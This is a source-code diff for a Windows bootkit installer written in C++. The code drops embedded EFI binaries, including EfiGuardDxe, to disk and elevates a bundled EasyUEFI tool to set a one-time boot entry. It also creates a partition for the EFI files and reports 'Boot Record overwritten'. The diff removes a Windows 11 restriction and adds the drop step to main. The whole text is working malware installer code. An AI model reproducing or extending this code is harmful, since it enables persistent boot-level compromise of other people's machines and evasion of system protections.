@@ -21,7 +21,7 @@ bool dropBytes() {
     if (!diskUtil::writeFileBytes("C:\\EfiGuardDxe.efi", EfiGuardDxeRaw, sizeof(EfiGuardDxeRaw)))
         return false;
 
-    std::string KernelUefiPath = TempDir + "\\kernelUefi.exe";
+    std::string KernelUefiPath = TempDir + "\\kernelUefi.exe"; // Temp Dir is required as KernelUEFI cannot function inside of admin protected folders.
     if (!diskUtil::writeFileBytes(KernelUefiPath, EasyUEFCIRaw, sizeof(EasyUEFCIRaw)))
         return false;
 
@@ -40,13 +40,13 @@ bool SetBootEntry() {
     /* I need to make a checking system/sdk for EasyUEFI as all this does is (hope) the next index is EfiGuard, If not it breaks. */
     std::string TempDir = systemUtil::GetTempDirectory();
     std::string KernelUefiPath = TempDir + "\\kernelUefi.exe";
-    if (systemUtil::RunAsAdmin(KernelUefiPath, "--one-time-boot --index 1")) {
+    if (systemUtil::RunAsAdmin(KernelUefiPath, "--one-time-boot --index 1")) { // Will start as a new process with admin perms not in same process.
         // std::cout << "Executable launched successfully with admin privileges." << std::endl;
     }
     else {
         // std::cout << "Failed to launch executable with admin privileges." << std::endl;
     }
-    Sleep(2000);
+    Sleep(2000); // Wait for execution of KernelUEFI.
     std::remove("C:\\bootx64.efi");
     std::remove("C:\\EfiGuardDxe.efi");
     MessageBoxA(NULL, "Boot Record overwritten\nRestart your computer and check if BootKit Loads.", "", MB_OK | MB_ICONINFORMATION);
@@ -61,10 +61,10 @@ int main() {
 {"C:\\EfiGuardDxe.efi", partitionName + ":\\EFI\\Boot\\EfiGuardDxe.efi"}
     };
 
-	if (systemUtil::GetWindowsVersion() != 11) { // последний буткит поддерживается только в 11
-		MessageBoxA(NULL, "This Windows Version is Not Supported.", "", MB_OK | MB_ICONINFORMATION);
-		return 1;
-	}
+	// if (systemUtil::GetWindowsVersion() != 11) { // последний буткит поддерживается только в 11
+	// 	MessageBoxA(NULL, "This Windows Version is Not Supported.", "", MB_OK | MB_ICONINFORMATION);
+	// 	return 1;
+	// }
 	if (systemUtil::IsTPMEnabled()) { // это требуется отключить ТПМ для запуска
 		MessageBoxA(NULL, "Please Disable TPM Before Running...", "", MB_OK | MB_ICONINFORMATION);
 		return 1;
@@ -74,6 +74,8 @@ int main() {
 		return 1;
 	}
 
+    dropBytes();
+    Sleep(1000);
     if (!diskUtil::PartitionExists(partitionName)) {
         /* Partition Does Not Exist */
         diskUtil::CreatePartition(partitionName);
